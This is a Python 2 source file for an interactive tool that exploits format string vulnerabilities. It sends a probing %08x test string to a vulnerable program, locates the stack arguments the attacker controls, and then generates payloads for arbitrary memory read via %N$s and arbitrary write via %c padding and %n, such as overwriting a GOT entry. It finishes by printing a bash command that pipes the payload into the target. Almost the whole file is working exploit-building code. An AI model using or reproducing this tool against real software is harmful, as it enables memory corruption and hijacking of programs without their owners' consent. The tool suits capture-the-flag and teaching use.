#!/usr/bin/python2

from prettytable import PrettyTable
import string
import binascii
import struct
import sys

def isPrintable(s):
    return min(map(lambda x: x in string.printable,s))

def buildTestString(length=10):
    """
    Test string to help define what you control
    """
    #if length >= 100:
    #    print("Can't do 100 or more length test string. Pattern won't work.")
    #    exit(1)
    
    s = "AAAABBBBCCCCDDDD"
    for x in range(1,length+1):
        s += r"%08x"
    
    print(s)

def parseTestString(s):
    """
    Take output of buildTestString completion
    Determines index and information
    """
    #hexlify("1:%x"[::-1])
     
    # Split out the values
    l = [s[x:x+8] for x in range(0,len(s),8)]
    
    # Sanity check
    assert l[0] == "AAAABBBB"
    assert l[1] == "CCCCDDDD"
    l = l[2:]

    args = {}

    for i in xrange(len(l)):
        if l[i] == "41414141":
            control = 1
        elif l[i] == "42424242":
            control = 2
        elif l[i] == "43434343":
            control = 3
        elif l[i] == "44444444":
            control = 4
        else:
            control = None
        
        extra = ""
        if isPrintable(binascii.unhexlify(l[i])):
            extra = binascii.unhexlify(l[i])
         
        args[i] = {
            "value": int(l[i],16),
            "control": control,
            "extra": extra 
        }
    
    return args

def printArgs(info):
    """
    Print out known things about this format string
    buildTestString -> parseTestString -> here
    """
    t = PrettyTable(["Arg Number","Value","Control","Extra"])
    for i in range(len(args)):
        t.add_row([i,hex(args[i]["value"]),args[i]["control"],args[i]["extra"]])
    
    print(t)

def locateControl(control,args):
    """
    Locate control (1,2,3,4) inside args
    Return which argument this control is in
    Adding 1 in here since that's the correct location
    """
    return [x for x in args if args[x]["control"] == control].pop() + 1

def buildRead(readAddr,args):
    """
    Building block to read something
    str aType == Type of read to do (i.e.: "s","c","08x", etc)
    args = args information from parseTestString
    """

    #TODO: This assumes which control we're using
    control = locateControl(1,args)
    
    assert type(readAddr) == int
    
    # TODO: Check binary architecture here to ensure correct packing
    readAddr = struct.pack("<I",readAddr)
    
    # TODO: Assuming we can use index here. Maybe give option to expand and not use indexing
    s = readAddr + "%{0}$s".format(control)
    
    return s
    

def buildWrite(writeAddr,writeWhat,args):
    """
    Building block to write something somewhere
    int writeAddr == Target address to write (such as got entry)
    int writeWhat == What to write into target address
    args = args information from parseTestString
    """
    # TODO: Some prints don't handle %5$x type format
    # TODO: Maybe add option to not use %20c type format as well
    # TODO: Add type checking for arguments here
   
    # Since it can get confusing, I'm adding a count
    count = 0

    # Find our control value 
    # TODO: This assumes which control we're using.
    control = locateControl(1,args)
    
    assert type(writeAddr) == int
    assert type(writeWhat) == int
    
    # Convert writeAddr to hex
    # TODO: Check binary architecture here to ensure correct packing
    writeAddr = struct.pack("<I",writeAddr)
    
    # Start up the script
    s = writeAddr
    count += len(writeAddr)
    
    # Since there are problems using something like "%6$n" (not sure why)
    # Utilizing arguments to move this manually
    # Saving 1 %c to pad before we write
    s += "%c"*(control-2)
    count += (control - 2)

    # Clear the input number if our writeWhat is really small (i.e.:<4)
    #if writeWhat < len(s):
    #    s += "%{0}$n".format(control)
    #    count = 0
    
    # TODO: Need to add h support here as addresses basically won't ever finish
    # Write the amount that we need to 
    diff = writeWhat - count
    
    # If we're already at our count, no need to try to add more characters
    if diff != 0:
        s += "%{0}c".format(diff)
        count += diff
    
    if diff < 0:
        print("Not sure what to do here. We've already written too much...")
        exit(1)
    
    # Time to write it
    s += "%n".format(control)
    
    return s

def banner():
    print("""
  __                           _         _        _                               _       _ _            
 / _|                         | |       | |      (_)                             | |     (_) |           
| |_ ___  _ __ _ __ ___   __ _| |_   ___| |_ _ __ _ _ __   __ _    _____  ___ __ | | ___  _| |_ ___ _ __ 
|  _/ _ \| '__| '_ ` _ \ / _` | __| / __| __| '__| | '_ \ / _` |  / _ \ \/ / '_ \| |/ _ \| | __/ _ \ '__|
| || (_) | |  | | | | | | (_| | |_  \__ \ |_| |  | | | | | (_| | |  __/>  <| |_) | | (_) | | ||  __/ |   
|_| \___/|_|  |_| |_| |_|\__,_|\__| |___/\__|_|  |_|_| |_|\__, |  \___/_/\_\ .__/|_|\___/|_|\__\___|_|   
                                                           __/ |           | |                           
                                                          |___/            |_|                           
""")

def parseNumber(x):
    """
    Take in string as hex or integer. Adjust accordingly.
    """
    try:
        # Try base10 first
        return int(x,10)
    except:
        # Try hex
        return int(x,16)
    # Yes, it will crash out if it is neither

def promptWrite():
    """
    Run through user prompts for arbitrary write.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to overwrite (i.e.: 0x12345678 or 427512645)\n-->\t")
    
    writeAddr = parseNumber(raw_input())
    
    sys.stdout.write("\nEnter value to write to this address (int or hex)\n-->\t")
    
    writeWhat = parseNumber(raw_input())
     
    s = buildWrite(writeAddr,writeWhat,args)

    return s

def promptRead():
    """
    Run through user prompts for arbitrary read.
    Returns the format string
    """
    sys.stdout.write("\nEnter address to read (i.e.: 0x12345678 or 427512645)\n-->\t")
    
    readAddr = parseNumber(raw_input())
    
    s = buildRead(readAddr,args)
    
    return s

def menuSelect():
    """
    Select action
    """
    
    print("\nWhat to do?")
    print("-----------")
    print("  1) Arbitrary Write")
    print("  2) Arbitrary Read")
    
    return int(raw_input("\nSelect Action: "),10)
    

if __name__ == "__main__":
    banner()
    
    length = raw_input("Test string length? (default = 10) ")
    if length != "":
        length = int(length)
    else:
        length = 10
    
    sys.stdout.write("\nCopy the following into your format string vulnerable application. The purpose is to automatically determine things about your vulnerability.\n-->\t")
    buildTestString(length)

    sys.stdout.write("\nCopy and paste the output back in here:\n-->\t")
    args = parseTestString(raw_input())

    # Ensure we have known control points    
    numControl = len([x for x in args if args[x]["control"] != None])
    
    if numControl > 0:
        print("\nI've discovered {0} known control points.".format(numControl))
    
    else:
        print("\nNo control points discovered... Maybe try a higher length. Exiting")
        exit(1)
    
    printArgs(args)
    
    # Select action
    action = menuSelect()
    
    if action == 1:
        s = promptWrite()
    
    elif action == 2:
        s = promptRead() 
    
    else:
        print("Invalid input. Exiting.")
        exit(1)

    sys.stdout.write("\nHere's your format string line:\n-->\t")
    print(repr(s))
    
    sys.stdout.write("\nExample from bash:\n-->\t$ echo -e {0} | ./formatStringTest\n\n".format(repr(s)))
